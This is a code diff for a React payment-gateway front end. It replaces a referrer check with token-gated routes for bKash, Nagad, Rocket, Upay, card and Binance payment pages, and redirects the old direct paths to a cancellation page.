@@ -2,7 +2,7 @@ import { Toaster } from "@/components/ui/toaster";
 import { Toaster as Sonner } from "@/components/ui/sonner";
 import { TooltipProvider } from "@/components/ui/tooltip";
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
-import { BrowserRouter, Routes, Route } from "react-router-dom";
+import { BrowserRouter, Routes, Route, Navigate, useParams } from "react-router-dom";
 
 import NotFound from "./pages/NotFound";
 import PaymentGateway from "./pages/PaymentGateway";
@@ -14,30 +14,45 @@ import CardPaymentPage from "./pages/payment/CardPaymentPage";
 import BinancePayment from "./pages/payment/BinancePayment";
 import PaymentCancelled from "./pages/payment/PaymentCancelled";
 import { FlowProvider } from "@/lib/flowRouter";
-import { useReferrerGuard } from "@/hooks/useReferrerGuard";
+import { FlowEntry, FlowTokenGate } from "@/components/FlowGates";
 
 const queryClient = new QueryClient();
 
-const GuardedRoutes = () => {
-  const { checking } = useReferrerGuard();
-  if (checking) return null;
+const METHOD_PAGES: Record<string, () => JSX.Element> = {
+  bkash: () => <BkashPayment />,
+  nagad: () => <NagadPayment />,
+  rocket: () => <RocketPayment />,
+  upay: () => <UpayPayment />,
+  card: () => <CardPaymentPage />,
+  visa: () => <CardPaymentPage />,
+  mastercard: () => <CardPaymentPage />,
+  binance: () => <BinancePayment />,
+};
+
+const MethodRoute = () => {
+  const { method = "" } = useParams();
+  const Page = METHOD_PAGES[method];
+  if (!Page) return <Navigate to="/payment-cancelled" replace />;
   return (
-    <Routes>
-      <Route path="/" element={<PaymentGateway />} />
-      <Route path="/payment" element={<PaymentGateway />} />
-      <Route path="/bkash" element={<BkashPayment />} />
-      <Route path="/nagad" element={<NagadPayment />} />
-      <Route path="/rocket" element={<RocketPayment />} />
-      <Route path="/upay" element={<UpayPayment />} />
-      <Route path="/card" element={<CardPaymentPage />} />
-      <Route path="/visa" element={<CardPaymentPage />} />
-      <Route path="/mastercard" element={<CardPaymentPage />} />
-      <Route path="/binance" element={<BinancePayment />} />
-      <Route path="/payment-cancelled" element={<PaymentCancelled />} />
-      <Route path="*" element={<NotFound />} />
-    </Routes>
+    <FlowTokenGate key={method} platform={method}>
+      <Page />
+    </FlowTokenGate>
   );
 };
+
+const GuardedRoutes = () => (
+  <Routes>
+    <Route path="/" element={<FlowEntry />} />
+    <Route path="/payment" element={<FlowEntry />} />
+    <Route path="/p/:token" element={<FlowTokenGate><PaymentGateway /></FlowTokenGate>} />
+    <Route path="/p/:token/:method" element={<MethodRoute />} />
+    <Route path="/payment-cancelled" element={<PaymentCancelled />} />
+    {["/bkash", "/nagad", "/rocket", "/upay", "/card", "/visa", "/mastercard", "/binance"].map((p) => (
+      <Route key={p} path={p} element={<Navigate to="/payment-cancelled" replace />} />
+    ))}
+    <Route path="*" element={<NotFound />} />
+  </Routes>
+);
 
 const App = () => (
   <QueryClientProvider client={queryClient}>
